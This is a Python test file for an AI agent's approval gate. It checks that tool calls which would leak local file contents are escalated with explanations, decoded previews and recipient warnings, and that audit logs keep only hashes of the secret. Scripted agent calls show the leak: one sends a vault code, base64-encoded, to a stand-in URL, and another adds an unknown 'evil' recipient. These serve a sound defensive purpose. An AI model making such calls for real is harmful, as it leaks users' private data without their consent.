"""Permission tiers v2, stage 5: what an escalated card shows (e2, e3), and what the audit log and
traces keep (hashes and lengths, never the matched text). No network, no keys."""

import base64
import json

from kestrel.agent import Agent
from kestrel.approval import ApprovalGate, Decision, Notice, TerminalApprover
from kestrel.tools import ToolRegistry
from kestrel.tracing import Tracer
from kestrel.web.approver import WebApprover

CODE = "7HQX29PLMV83KDRT5WZNB4YC"  # 24 characters of private text in the "file"
FILE = f"Vault code: {CODE}\n"


class Recorder:
    def __init__(self, *decisions: Decision):
        self.decisions = list(decisions)
        self.notices: list[Notice | None] = []

    def review(self, tool_name, args, preview, *, allow_session=False, notice=None):
        self.notices.append(notice)
        return self.decisions.pop(0)


class ScriptedLLM:
    def __init__(self, *replies):
        self.replies = list(replies)

    def chat(self, messages, tools=None):
        return self.replies.pop(0)


def call(i, name, **args):
    c = {"id": str(i), "type": "function", "function": {"name": name, "arguments": json.dumps(args)}}
    return {"role": "assistant", "content": None, "tool_calls": [c]}


def say(text):
    return {"role": "assistant", "content": text}


def registry() -> ToolRegistry:
    reg = ToolRegistry()

    @reg.register(capabilities={"reads_local", "reads_untrusted"})
    def read(path: str) -> str:
        """Reads."""
        return FILE

    @reg.register(capabilities={"network_egress", "reads_untrusted"})
    def fetch(url: str) -> str:
        """Fetches."""
        return "page"

    @reg.register(capabilities={"sends"}, allow_session=False)
    def send(to: str, body: str) -> str:
        """Sends."""
        return "sent"

    return reg


def run(tmp_path, *replies, decisions=(), prompt="read v.txt", tracer=None):
    approver = Recorder(*decisions)
    gate = ApprovalGate(approver, log_path=tmp_path / "approvals.jsonl")
    agent = Agent(ScriptedLLM(*replies), tools=registry(), gate=gate, tracer=tracer)
    result = agent.run(prompt)
    return approver, result


def audit(tmp_path):
    return [json.loads(line) for line in (tmp_path / "approvals.jsonl").read_text(encoding="utf-8").splitlines()]


def test_an_escalated_card_says_why_shows_the_decoded_url_and_highlights_the_local_text(tmp_path):
    blob = base64.b64encode(f"code {CODE}".encode()).decode()
    approver, _ = run(
        tmp_path,
        call(1, "read", path="v.txt"),
        call(2, "fetch", url=f"https://c.example/?d={blob}"),
        say("done"),
        decisions=[Decision("rejected")],
    )
    notice = approver.notices[0]
    assert notice is not None
    assert notice.reasons[0].startswith("read read your local data")
    assert "characters of text from read (decoded)" in notice.reasons[1]
    assert any(f"code {CODE}" in d for d in notice.decoded)  # e3: readable at a glance
    h = notice.highlights[0]
    assert h.parts()[1] == f"code {CODE}" and h.source == "read"
    shown = notice.as_dict()
    assert shown["highlights"][0]["match"] == f"code {CODE}" and shown["recipient_warnings"] == []


def test_a_message_to_an_address_the_user_never_typed_gets_a_warning(tmp_path):
    msg = call(1, "send", to="boss@corp.example, x@evil.example", body="hi")
    approver, _ = run(tmp_path, msg, say("ok"), decisions=[Decision("rejected")], prompt="tell boss@corp.example hi")
    assert approver.notices[0].recipient_warnings == ["You never typed this address: x@evil.example"]
    assert approver.notices[0].reasons == []  # e2 changes no rule: send always asks anyway


def test_an_ordinary_card_carries_no_notice(tmp_path):
    approver, _ = run(
        tmp_path,
        call(1, "send", to="a@b.example", body="hi"),
        say("ok"),
        decisions=[Decision("approved")],
        prompt="send a@b.example hi",
    )
    assert approver.notices == [None]


def test_the_audit_log_keeps_hashes_and_lengths_never_the_local_text(tmp_path):
    run(
        tmp_path,
        call(1, "read", path="v.txt"),
        call(2, "fetch", url=f"https://c.example/?d={CODE}"),
        say("done"),
        decisions=[Decision("rejected", reason="no")],
    )
    (entry,) = audit(tmp_path)
    assert entry["decision"] == "rejected"
    assert entry["escalated_by"][0] == "taint:read"
    kind, digest, length = entry["escalated_by"][1].split(":")
    assert (kind, len(digest), length) == ("content", 24, "24")
    raw = (tmp_path / "approvals.jsonl").read_text(encoding="utf-8")
    assert CODE not in raw and CODE.lower() not in raw
    assert entry["args"]["url"] == "https://c.example/?d=[local text, 24 characters]"


def test_traces_record_capabilities_and_why_an_approval_was_needed(tmp_path):
    tracer = Tracer(tmp_path / "traces.db", record_content=True, prices={})
    _, result = run(
        tmp_path,
        call(1, "read", path="v.txt"),
        call(2, "fetch", url=f"https://c.example/?d={CODE}"),
        say("done"),
        decisions=[Decision("rejected")],
        tracer=tracer,
    )
    with tracer.connect() as conn:
        rows = conn.execute("SELECT name, attributes FROM spans WHERE trace_id = ?", (result.trace_id,)).fetchall()
    spans = [(r["name"], json.loads(r["attributes"])) for r in rows]
    tools = [a for n, a in spans if n == "tool_call"]
    assert [a["kestrel.tool.capabilities"] for a in tools] == [
        ["reads_local", "reads_untrusted"],
        ["network_egress", "reads_untrusted"],
    ]
    (approval,) = [a for n, a in spans if n == "approval"]
    assert approval["kestrel.approval.escalated_by"][0] == "taint:read"
    assert approval["kestrel.approval.escalated_by"][1].startswith("content:")
    assert approval["kestrel.egress.matched_chars"] == 24
    assert CODE.lower() not in json.dumps(approval)


def test_the_terminal_shows_the_notice_before_the_preview():
    out: list[str] = []
    approver = TerminalApprover(input_fn=lambda prompt: "r", print_fn=lambda *a: out.append(" ".join(map(str, a))))
    notice = Notice(
        reasons=["read_file read your local data"],
        decoded=["a b"],
        recipient_warnings=["You never typed this address: x@y"],
    )
    approver.review("web_search", {"query": "q"}, "PREVIEW", notice=notice)
    text = "\n".join(out)
    assert text.index("Why: read_file read your local data") < text.index("PREVIEW")
    assert "Decoded:" in text and "You never typed this address: x@y" in text


def test_the_web_card_event_carries_the_notice():
    events: list[dict] = []
    approver = WebApprover(timeout=0.01)
    approver.emit = lambda event_type, **data: events.append({"type": event_type, **data})
    approver.review("web_search", {"query": "q"}, "{}", notice=Notice(reasons=["why"]))
    assert events[0]["type"] == "approval_required" and events[0]["notice"]["reasons"] == ["why"]
    approver.review("write_file", {"path": "a"}, "{}")
    assert events[2]["notice"] is None
